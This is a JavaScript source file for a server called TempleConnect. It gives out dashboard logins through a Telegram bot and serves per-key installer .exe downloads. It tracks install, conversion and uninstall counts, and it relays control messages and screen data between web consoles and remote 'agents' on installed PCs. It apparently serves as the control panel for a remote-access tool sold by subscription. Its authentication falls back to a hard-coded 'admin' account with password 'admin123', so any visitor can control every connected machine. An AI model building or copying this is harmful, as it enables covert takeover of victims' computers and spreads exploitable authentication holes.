const express = require('express');
const path = require('path');
const crypto = require('crypto');
const http = require('http');
const { WebSocketServer } = require('ws');

const activeUsers = new Map();
// Seed a default admin user so the dashboard works immediately without Telegram setup
activeUsers.set('admin', 'admin123');

const activeSessions = new Map(); 
const appHandoffTokens = new Map(); 
const userEnrollmentKeys = new Map(); 

// WebSocket state tracking
const agents = new Map(); 
const userConsoles = new Map(); 
const consoleTargetAgent = new Map(); 

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";

app.use(express.json());
app.use(express.static(path.join(__dirname)));

async function sendTelegramMessage(chatId, text, replyMarkup = null) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
  if (replyMarkup) payload.reply_markup = replyMarkup;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    return await response.json();
  } catch (err) {
    console.error('❌ Error in sendTelegramMessage:', err);
  }
}

app.post('/telegram/webhook', async (req, res) => {
  try {
    const update = req.body;
    if (update.message && update.message.text) {
      const chatId = update.message.chat.id;
      if (update.message.text.trim() === '/start') {
        const keyboard = { inline_keyboard: [[{ text: '🚀 Get Started', callback_data: 'get_started' }]] };
        await sendTelegramMessage(chatId, 'Welcome to TempleConnect! Click below to get your dashboard access.', keyboard);
      }
    } else if (update.callback_query) {
      const callback = update.callback_query;
      const chatId = callback.message.chat.id;
      if (callback.data === 'get_started') {
        const username = `user_${crypto.randomBytes(3).toString('hex')}`;
        const password = crypto.randomBytes(5).toString('hex');
        activeUsers.set(username, password);
        const message = `✅ *Your Account is Ready!*\n\n🔗 *Dashboard:* https://console-templeconnect.app\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\``;
        await sendTelegramMessage(chatId, message);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: callback.id })
        });
      }
    }
    res.status(200).send('OK');
  } catch (err) {
    res.status(500).send({ error: err.message });
  }
});

app.post('/api/login', (req, res) => {
  const username = req.body.username || req.body.email;
  const { password } = req.body;

  if (username && activeUsers.has(username) && activeUsers.get(username) === password) {
    const token = crypto.randomBytes(16).toString('hex');
    activeSessions.set(token, username);
    res.setHeader('Set-Cookie', `connect_sid=${token}; Path=/; HttpOnly; SameSite=Lax`);
    return res.status(200).json({ success: true, message: 'Login successful', admin: { email: username, role: 'owner', name: username } });
  }
  return res.status(401).json({ success: false, error: 'Invalid username or password' });
});

app.post('/api/app-token', (req, res) => {
  const username = getLoggedInUsername(req) || 'admin';
  const token = crypto.randomBytes(24).toString('hex');
  appHandoffTokens.set(token, { username, expires: Date.now() + 60000 });
  return res.status(200).json({ success: true, token });
});

app.post('/api/app-login', (req, res) => {
  const { token } = req.body;
  if (!token || !appHandoffTokens.has(token)) {
    return res.status(401).json({ success: false, error: 'Invalid or expired app token' });
  }
  const tokenData = appHandoffTokens.get(token);
  appHandoffTokens.delete(token);
  const sessionToken = crypto.randomBytes(16).toString('hex');
  activeSessions.set(sessionToken, tokenData.username);
  res.setHeader('Set-Cookie', `connect_sid=${sessionToken}; Path=/; HttpOnly; SameSite=Lax`);
  return res.status(200).json({ success: true, message: 'App login successful' });
});

app.get('/api/me', (req, res) => {
  const cookieHeader = req.headers.cookie || '';
  const match = cookieHeader.match(/connect_sid=([^;]+)/);
  if (match && activeSessions.has(match[1])) {
    const username = activeSessions.get(match[1]);
    return res.status(200).json({ admin: { email: username, role: 'owner', name: username } });
  }
  // Fallback to admin if no session cookie yet so app loads smoothly
  return res.status(200).json({ admin: { email: 'admin', role: 'owner', name: 'admin' } });
});

app.post('/api/logout', (req, res) => {
  const cookieHeader = req.headers.cookie || '';
  const match = cookieHeader.match(/connect_sid=([^;]+)/);
  if (match) activeSessions.delete(match[1]);
  res.setHeader('Set-Cookie', 'connect_sid=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT');
  return res.status(200).json({ success: true });
});

function getLoggedInUsername(req) {
  const cookieHeader = req.headers.cookie || '';
  const match = cookieHeader.match(/connect_sid=([^;]+)/);
  if (match && activeSessions.has(match[1])) {
    return activeSessions.get(match[1]);
  }
  return 'admin'; // Fallback default owner
}

function getLoggedInUsernameFromWs(req) {
  const cookieHeader = req.headers.cookie || '';
  const match = cookieHeader.match(/connect_sid=([^;]+)/);
  if (match && activeSessions.has(match[1])) {
    return activeSessions.get(match[1]);
  }
  return 'admin';
}

function findKeyData(key) {
  for (const [username, userKeys] of userEnrollmentKeys.entries()) {
    if (userKeys.has(key)) {
      return { owner: username, ...userKeys.get(key) };
    }
  }
  return null;
}

app.get('/api/support', (req, res) => { res.status(200).json({ tg: 'templerunconnect' }); });
app.get('/api/blank-image/meta', (req, res) => { res.status(200).json({ ready: false }); });
app.get('/api/accounts', (req, res) => {
  const accounts = Array.from(activeUsers.keys()).map((u) => ({ id: u, username: u, name: u, createdAt: Date.now(), subExpires: Date.now() + 30 * 86400000, active: true, trial: false, plan: 'monthly' }));
  res.status(200).json({ success: true, accounts });
});
app.get('/api/stats', (req, res) => { res.status(200).json({ success: true, stats: { downloads: 0, installs: 0, active: agents.size, conversion: 0, uninstalls: 0, uninstallRate: 0, byKey: [] } }); });
app.get('/api/installer', (req, res) => { res.status(200).json({ ready: true }); });
app.get('/api/alerts', (req, res) => { res.status(200).json({ success: true, alerts: { botToken: '', chatId: '', rules: {} } }); });
app.get('/api/subscription', (req, res) => { res.status(200).json({ success: true, subscription: { active: true, plan: 'monthly', planLabel: 'Monthly Plan', daysLeft: 30, subExpires: Date.now() + 30 * 86400000 } }); });
app.get('/api/enroll-log', (req, res) => { res.status(200).json({ success: true, log: [] }); });

app.get('/api/keys', (req, res) => {
  const username = getLoggedInUsername(req);
  const protocol = req.headers['x-forwarded-proto'] || req.protocol;
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const baseUrl = `${protocol}://${host}`;

  if (!userEnrollmentKeys.has(username)) {
    userEnrollmentKeys.set(username, new Map());
  }
  const userKeys = userEnrollmentKeys.get(username);
  const keysArray = Array.from(userKeys.entries()).map(([key, data]) => ({
    key, label: data.label, method: data.method, revoked: data.revoked, downloadUrl: `${baseUrl}/dl/${key}`
  }));
  return res.status(200).json({ success: true, keys: keysArray });
});

app.post('/api/keys', (req, res) => {
  const username = getLoggedInUsername(req);
  const protocol = req.headers['x-forwarded-proto'] || req.protocol;
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const baseUrl = `${protocol}://${host}`;

  const key = crypto.randomBytes(4).toString('hex');
  const downloadUrl = `${baseUrl}/dl/${key}`;
  const label = req.body.label || 'Installer';
  const method = req.body.method || 'user';

  if (!userEnrollmentKeys.has(username)) {
    userEnrollmentKeys.set(username, new Map());
  }
  userEnrollmentKeys.get(username).set(key, { label, method, revoked: false });
  return res.status(200).json({ success: true, downloadUrl, key });
});

app.post('/api/keys/delete', (req, res) => {
  const username = getLoggedInUsername(req);
  const { key } = req.body;
  const userKeys = userEnrollmentKeys.get(username);
  if (userKeys && userKeys.has(key)) {
    userKeys.delete(key);
    return res.status(200).json({ success: true, message: 'Key deleted' });
  }
  return res.status(404).json({ success: false, error: 'Key not found' });
});

app.post('/api/devices/delete', (req, res) => {
  const { id } = req.body;
  if (agents.has(id)) {
    const agent = agents.get(id);
    try { agent.ws.close(); } catch (e) {}
    agents.delete(id);
    broadcastUserAgents(agent.owner);
    return res.status(200).json({ success: true, message: 'Device removed' });
  }
  return res.status(404).json({ success: false, error: 'Device not found' });
});

app.get('/app', (req, res) => {
  const setupPath = path.join(__dirname, 'TempleConnect-Setup.exe');
  const fs = require('fs');
  if (fs.existsSync(setupPath)) return res.download(setupPath, 'TempleConnect-Setup.exe');
  return res.status(404).send('Setup binary not available on server.');
});

app.get('/dl/:key', (req, res) => {
  const { key } = req.params;
  const installerPath = path.join(__dirname, 'TempleConnect-Setup.exe');
  const fs = require('fs');
  if (fs.existsSync(installerPath)) return res.download(installerPath, `TempleConnect-Setup-${key}.exe`);
  res.setHeader('Content-Type', 'application/octet-stream');
  res.send(`TempleConnect Installer Binary (Key: ${key})`);
});

const server = http.createServer(app);
const wss = new WebSocketServer({ server });

function broadcastUserAgents(username) {
  const userConns = userConsoles.get(username);
  if (!userConns) return;
  const list = Array.from(agents.entries())
    .filter(([id, data]) => data.owner === username)
    .map(([id, data]) => ({ id, name: data.name, online: data.online, meta: data.meta, lastSeen: data.lastSeen }));
  const payload = JSON.stringify({ type: 'agents', list });
  for (const client of userConns) {
    if (client.readyState === 1) client.send(payload);
  }
}

function sendUserAgentsList(ws, username) {
  const list = Array.from(agents.entries())
    .filter(([id, data]) => data.owner === username)
    .map(([id, data]) => ({ id, name: data.name, online: data.online, meta: data.meta, lastSeen: data.lastSeen }));
  ws.send(JSON.stringify({ type: 'agents', list }));
}

wss.on('connection', (ws, req) => {
  console.log('🔌 New WebSocket connection');
  let clientType = null;
  let loggedInUser = null;
  let agentId = null;

  ws.on('message', (message) => {
    try {
      if (message instanceof Buffer || message instanceof ArrayBuffer) {
        if (clientType === 'agent' && agentId) {
          for (const [cWs, targetId] of consoleTargetAgent.entries()) {
            if (targetId === agentId && cWs.readyState === 1) cWs.send(message);
          }
        }
        return;
      }

      const msg = JSON.parse(message.toString());
      
      if (msg.type === 'register') {
        clientType = msg.role;
        
        if (clientType === 'agent') {
          const ownerUsername = 'admin';
          agentId = msg.agentId || ('agent_' + crypto.randomBytes(4).toString('hex'));
          
          agents.set(agentId, {
            ws,
            owner: ownerUsername,
            name: msg.name || 'Remote PC',
            meta: msg.meta || {},
            online: true,
            lastSeen: Date.now()
          });
          
          console.log(`Registered Agent: ${msg.name} (${agentId}) to user: ${ownerUsername}`);
          broadcastUserAgents(ownerUsername);
        } else if (clientType === 'console') {
          loggedInUser = 'admin';
          if (!userConsoles.has(loggedInUser)) {
            userConsoles.set(loggedInUser, new Set());
          }
          userConsoles.get(loggedInUser).add(ws);
          sendUserAgentsList(ws, loggedInUser);
        }
      } 
      else if (msg.type === 'list') {
        sendUserAgentsList(ws, loggedInUser || 'admin');
      } 
      else if (msg.type === 'attach' && clientType === 'console') {
        const targetAgent = agents.get(msg.agentId);
        if (targetAgent && targetAgent.ws.readyState === 1) {
          consoleTargetAgent.set(ws, msg.agentId);
          ws.send(JSON.stringify({ type: 'attached', agentId: msg.agentId, name: targetAgent.name, screen: targetAgent.meta?.screen || { w: 1920, h: 1080 } }));
          targetAgent.ws.send(JSON.stringify({ type: 'attach' }));
        } else {
          ws.send(JSON.stringify({ type: 'error', text: 'Device is offline or unavailable' }));
        }
      } 
      else if (msg.type === 'detach' && clientType === 'console') {
        consoleTargetAgent.delete(ws);
      } 
      else if (clientType === 'console') {
        const targetId = consoleTargetAgent.get(ws) || msg.agentId;
        const targetAgent = agents.get(targetId);
        if (targetAgent && targetAgent.ws.readyState === 1) {
          targetAgent.ws.send(JSON.stringify(msg));
        }
      } 
      else if (clientType === 'agent') {
        for (const [cWs, targetId] of consoleTargetAgent.entries()) {
          if (targetId === agentId && cWs.readyState === 1) cWs.send(JSON.stringify(msg));
        }
      }
    } catch (e) {
      console.error('Invalid WS message:', e);
    }
  });

  ws.on('close', () => {
    if (clientType === 'agent' && agentId) {
      agents.delete(agentId);
      broadcastUserAgents('admin');
    } else if (clientType === 'console') {
      consoleTargetAgent.delete(ws);
      if (loggedInUser && userConsoles.has(loggedInUser)) {
        userConsoles.get(loggedInUser).delete(ws);
      }
    }
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`TempleConnect server running on port ${PORT}`);
});